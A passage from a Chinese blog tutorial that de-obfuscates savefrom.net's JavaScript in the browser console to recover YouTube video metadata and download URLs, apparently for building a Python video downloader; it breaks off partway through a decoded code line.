function_">_b</span>($c);</span><br><span class="line"><span class="title function_">_m</span>($b, $c);</span><br></pre></td></tr></table></figure><p>去掉前5行没有意义的变量互换值，加密解密函数存在的范围就在最后3行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$c = <span class="title function_">_q</span>($c);</span><br><span class="line">$c = <span class="title function_">_b</span>($c);</span><br><span class="line"><span class="title function_">_m</span>($b, $c);</span><br></pre></td></tr></table></figure><p>然后开始一个个试<br>先在<code>console</code>里输入第一行<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-9.png" alt="console"><br>然后就出现了明文，所以我们就确定这个是我们需要的解密函数<br>接下来输入第二行<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-10.png" alt="console2"><br>发现出现了和上面一模一样的明文，所以这个也是解密函数<br>接下来输入第三行<br>发现这个执行了那段代码，这个应该是执行函数，所以我们现在就找到了解密函数位于js部分的最后几行</p><h3 id="v-解析解密后的结果"><a href="#v-解析解密后的结果" class="headerlink" title="v.解析解密后的结果"></a>v.解析解密后的结果</h3><p>把<code>console</code>里用解密函数解密出的结果复制出来会得到一个JavaScript脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">del</span>(<span class="params"></span>)&#123;<span class="keyword">while</span>(<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstChild</span>)&#123;<span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstChild</span>);&#125;&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hostname</span>.<span class="title function_">search</span>(<span class="regexp">/(?:^|\.|@)(savefrom\.net|sfrom\.net|savefrom\.com\.au|51\.159\.57\.158|(?:fe\d*|test)-front\.sf-apps\.com)$/i</span>) == -<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;Please go to http://savefrom.net/ to get direct links&#x27;</span>);</span><br><span class="line"><span class="title function_">del</span>();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showResult</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> success = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> d = <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">document</span>;</span><br><span class="line"><span class="keyword">if</span>(d &amp;&amp; d.<span class="property">getElementById</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> e = d.<span class="title function_">getElementById</span>(<span class="string">&#x27;sf_result&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(e &amp;&amp; e.<span class="property">innerHTML</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">sf</span>.<span class="title function_">finishRequest</span>(<span class="literal">true</span>);;</span><br><span class="line">e.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">sf</span>.<span class="property">videoResult</span>.<span class="title function_">show</span>(&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;YPvtz1lHRiw&quot;</span>,<span class="string">&quot;cipher&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;meta&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;The Most Genius Plays in Football&quot;</span>,<span class="string">&quot;source&quot;</span>:<span class="string">&quot;https:\/\/www.youtube.com\/watch?v=YPvtz1lHRiw&quot;</span>,<span class="string">&quot;duration&quot;</span>:<span class="string">&quot;7:03&quot;</span>,<span class="string">&quot;tags&quot;</span>:<span class="string">&quot;lionel messi,football tiki taka,football highlight,football team plays,kevin de bruyne,mesut \u00f6zil,paul pogba,cristiano ronaldo,adama traore,luka modric,toni kroos,andres iniesta,kylian mbappe,neymar jr,zlatan ibrahimovic,franck ribery,paulo dybala,philippe coutinho,robert lewandowski,barcelona,real madrid,liverpool,manchester city&quot;</span>&#125;,<span class="string">&quot;thumb&quot;</span>:<span class="string">&quot;https:\/\/i.ytimg.com\/vi\/YPvtz1lHRiw\/hqdefault.jpg&quot;</span>,<span class="string">&quot;itags&quot;</span>:[<span class="string">&quot;18&quot;</span>,<span class="string">&quot;22&quot;</span>,<span class="string">&quot;133&quot;</span>,<span class="string">&quot;134&quot;</span>,<span class="string">&quot;135&quot;</span>,<span class="string">&quot;136&quot;</span>,<span class="string">&quot;137&quot;</span>,<span class="string">&quot;140&quot;</span>,<span class="string">&quot;160&quot;</span>,<span class="string">&quot;242&quot;</span>,<span class="string">&quot;243&quot;</span>,<span class="string">&quot;244&quot;</span>,<span class="string">&quot;247&quot;</span>,<span class="string">&quot;248&quot;</span>,<span class="string">&quot;249&quot;</span>,<span class="string">&quot;250&quot;</span>,<span class="string">&quot;251&quot;</span>,<span class="string">&quot;278&quot;</span>],<span class="string">&quot;video_quality&quot;</span>:[<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;720&quot;</span>,<span class="string">&quot;480&quot;</span>,<span class="string">&quot;360&quot;</span>,<span class="string">&quot;240&quot;</span>,<span class="string">&quot;144&quot;</span>],<span class="string">&quot;url&quot;</span>:[&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=18&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;gir=yes&amp;clen=35202709&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603720879883261&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5531422&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgN_iBsjO6zSiW9dcOYYExfjeVuy1YCXtWcKT0cz2kMcECIQCMre2rssbqkWdohk9K4Ej8B8r9gARVc0-kAHVqhV1teQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;MP4&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;360&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=18&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;gir=yes&amp;clen=35202709&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603720879883261&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5531422&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgN_iBsjO6zSiW9dcOYYExfjeVuy1YCXtWcKT0cz2kMcECIQCMre2rssbqkWdohk9K4Ej8B8r9gARVc0-kAHVqhV1teQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;360&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;18&quot;</span>,<span class="string">&quot;filesize&quot;</span>:<span class="number">35202709</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 360&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;0c41b67f74ccb97e50f2e64fe5f4625a&quot;</span>&#125;,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=22&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603723118280830&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5535432&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgWg_KEKuXDFH-OcphoOxU2tjE9B0WnidilKpa-vtbmigCIQD-eJlhFHZMi1VzRYI_jh0RZaMiLkkXYWnwGM2TJp0bLA%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&amp;title=The%20Most%20Genius%20Plays%20in%20Football&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;MP4&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;720&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=22&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603723118280830&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5535432&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgWg_KEKuXDFH-OcphoOxU2tjE9B0WnidilKpa-vtbmigCIQD-eJlhFHZMi1VzRYI_jh0RZaMiLkkXYWnwGM2TJp0bLA%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;720&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;22&quot;</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 720&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;674fa89ee246148990b3f36e750a5d32&quot;</span>&#125;,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=137&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=177708494&amp;dur=422.999&amp;lmt=1603723164407782&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIhANMFMA1ypwGQjiGT_DlqlYwfqcqu1IlKZGoCrdIqWmzHAiAyOJJHIzUBcMQ6WBeEnepV4UlD3TY6rGSNKBVSVhbpIQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;MP4&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=137&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=177708494&amp;dur=422.999&amp;lmt=1603723164407782&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIhANMFMA1ypwGQjiGT_DlqlYwfqcqu1IlKZGoCrdIqWmzHAiAyOJJHIzUBcMQ6WBeEnepV4UlD3TY6rGSNKBVSVhbpIQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;mp4 dash&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;137&quot;</span>,<span class="string">&quot;filesize&quot;</span>:<span class="number">177708494</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 1080 (without audio)&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;no-audio&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;6816215e43020185bb429874c33f1f73&quot;</span>&#125;,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=248&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fwebm&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=117037047&amp;dur=422.999&amp;lmt=1603725149388225&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRgIhANFyBfTGjhDMawSTzN1NjLLYLztYc8e6w3lXVXY5ldbxAiEA-UBT6Yb33Sr0Yhan0x9xlf1xVWFH-wu_y2HsgWkiuXo%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;WEBM&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=248&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fwebm&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=117037047&amp;dur=422.999&amp;lmt=1603725149388225&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRgIhANFyBfTGjhDMawSTzN1NjLLYLztYc8e6w3lXVXY5ldbxAiEA-UBT6Yb33Sr0Yhan0x9xlf1xVWFH-wu_y2HsgWkiuXo%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;webm dash&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;webm&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;248&quot;</span>,<span class="string">&quot;filesize&quot;</span>:<span class="number">117037047</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 1080 (without audio)&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;no-audio&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;43e803aa40437c9930975615121cc2c5&quot;</span>&#125;],<span class="string">&quot;hosting&quot;</span>:<span class="number">101</span>,<span class="string">&quot;srv&quot;</span>:<span class="string">&quot;s30&quot;</span>,<span class="string">&quot;sd&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;hd&quot;</span>:<span class="literal">null</span>&#125;);;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">sf</span>.<span class="title function_">enableElement</span>(<span class="string">&#x27;sf_submit&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">success=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(err)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">del</span>();</span><br><span class="line"><span class="keyword">if</span>(!success)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> alt = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(alt) <span class="title function_">alert</span>(alt);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> navigator.<span class="property">permissions</span> != <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">navigator.<span class="property">permissions</span>.<span class="title function_">query</span>(&#123;<span class="attr">name</span>:<span class="string">&#x27;notifications&#x27;</span>&#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">permissionStatus</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title class_">Notification</span>.<span class="property">permission</span> === <span class="string">&#x27;denied&#x27;</span> &amp;&amp; permissionStatus.<span class="property">state</span> === <span class="string">&#x27;prompt&#x27;</span>) &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_">showResult</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_">showResult</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="title function_">showResult</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>我们可以发现里面有个<code>del()</code>删除函数，这就是为什么我们看不到这一段代码在执行后<br>因为被<code>window.location.hostname.search(/(?:^|\.|@)(savefrom\.net|sfrom\.net|savefrom\.com\.au|51\.159\.57\.158|(?:fe\d*|test)-front\.sf-apps\.com)$/i) == -1</code>检查出不是在他的网站上跑的所以就执行弹窗和<code>del()</code>把解密后的东西删除了<br>仔细检查这段代码可以发现这一行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">sf</span>.<span class="property">videoResult</span>.<span class="title function_">show</span>(&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;YPvtz1lHRiw&quot;</span>,<span class="string">&quot;cipher&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;meta&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;The Most Genius Plays in Football&quot;</span>,<span class="string">&quot;source&quot;</span>:<span class="string">&quot;https:\/\/www.youtube.com\/watch?v=YPvtz1lHRiw&quot;</span>,<span class="string">&quot;duration&quot;</span>:<span class="string">&quot;7:03&quot;</span>,<span class="string">&quot;tags&quot;</span>:<span class="string">&quot;lionel messi,football tiki taka,football highlight,football team plays,kevin de bruyne,mesut \u00f6zil,paul pogba,cristiano ronaldo,adama traore,luka modric,toni kroos,andres iniesta,kylian mbappe,neymar jr,zlatan ibrahimovic,franck ribery,paulo dybala,philippe coutinho,robert lewandowski,barcelona,real madrid,liverpool,manchester city&quot;</span>&#125;,<span class="string">&quot;thumb&quot;</span>:<span class="string">&quot;https:\/\/i.ytimg.com\/vi\/YPvtz1lHRiw\/hqdefault.jpg&quot;</span>,<span class="string">&quot;itags&quot;</span>:[<span class="string">&quot;18&quot;</span>,<span class="string">&quot;22&quot;</span>,<span class="string">&quot;133&quot;</span>,<span class="string">&quot;134&quot;</span>,<span class="string">&quot;135&quot;</span>,<span class="string">&quot;136&quot;</span>,<span class="string">&quot;137&quot;</span>,<span class="string">&quot;140&quot;</span>,<span class="string">&quot;160&quot;</span>,<span class="string">&quot;242&quot;</span>,<span class="string">&quot;243&quot;</span>,<span class="string">&quot;244&quot;</span>,<span class="string">&quot;247&quot;</span>,<span class="string">&quot;248&quot;</span>,<span class="string">&quot;249&quot;</span>,<span class="string">&quot;250&quot;</span>,<span class="string">&quot;251&quot;</span>,<span class="string">&quot;278&quot;</span>],<span 